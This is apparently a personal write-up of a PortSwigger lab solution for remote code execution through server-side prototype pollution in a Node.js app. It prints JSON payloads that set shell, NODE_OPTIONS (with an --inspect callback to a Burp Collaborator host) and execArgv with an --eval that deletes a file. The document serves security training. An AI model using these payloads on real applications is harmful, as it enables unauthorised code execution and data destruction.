# [Remote code execution via server-side prototype pollution] — [PortSwigger] — [Practitioner]
**Date:** 2026-08-05
 
---
 
## Vulnerability / core concept
RCE via Server-side Prototype Pollution

---


## Payload / key command
After loggin in to our account, we can change details about our user. Intercepting this request lets us alter JSON body sent to the browser. To test, whether we can perform RCE in this web application, first we need to make sure that we can execute any command. To do so we add the following `key:value` payload to the request:
```js
{
   "__proto__":{
      "shell":"node",
      "NODE_OPTIONS":"--inspect=-burpcollaborator.oast\"\"ify.com"
   }
}
```
However, sending this does not work immediately. We need to find an action in the web application that will start a new process, so that process will use our newly supplied `NODE_OPTIONS`. In this application we can do that by using `Admin panel` -> `Maintenance Job`. Now, we can see that web app send request to our Burp Collaborator server. After we confirmed this, I tried to delete `/home/carlos/morale.txt`:
```js
{
   "__proto__":{
      "shell":"node",
      "NODE_OPTIONS":"--eval=require('fs').unlinkSync('/home/carlos/morale.txt')"
   }
}
```
However, this did not work as I could not perform the maintenance jobs anymore: I was receiving some error. Because this did not work, I tried to use `execArgv` property:
```js
{
   "address_line_1":"Wiener HQ",
   "address_line_2":"One Wiener Way",
   "city":"Wienerville",
   "postcode":"BU1 1RP",
   "country":"UK",
   "sessionId":"bvpU6it3P1GeVin8fPnzcfuNczCRcEiz",
   "__proto__":{
      "shell":"node",
      "NODE_OPTIONS":"--inspect=burp-collaborator.oast\"\"ify.com",
      "execArgv":[
         "--eval=require('fs').unlinkSync('/home/carlos/morale.txt')"
      ]
   }
}
```
Doing this deleted `morale.txt` file from `carlos`'s home and solved this lab.

P.S.: After doing some research I found why `NODE_OPTIONS` might not working:

`NODE_OPTIONS` injected `--eval`, but the maintenance job's node process was already being launched with a script file argument — and Node doesn't allow `--eval` to be combined with a script file (mutually exclusive), so it errored out instead of running.
